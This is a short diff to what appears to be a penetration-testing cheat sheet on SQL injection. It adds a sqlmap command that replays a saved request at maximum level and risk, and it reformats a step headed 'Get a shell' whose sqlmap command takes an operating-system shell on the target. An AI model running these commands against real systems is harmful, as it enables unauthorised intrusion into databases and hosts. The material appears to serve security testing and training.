@@ -194,7 +194,11 @@ commix \
     --risk=3 \
     --dump
   ```
-  **Get a shell**
+- **use the whole request**  
+  ```bash
+  sqlmap -r req.txt --level=5 --risk=3 --batch
+  ```
+- **Get a shell**
   ```bash
    sqlmap $URL --data=$data --os-shell        
   ```
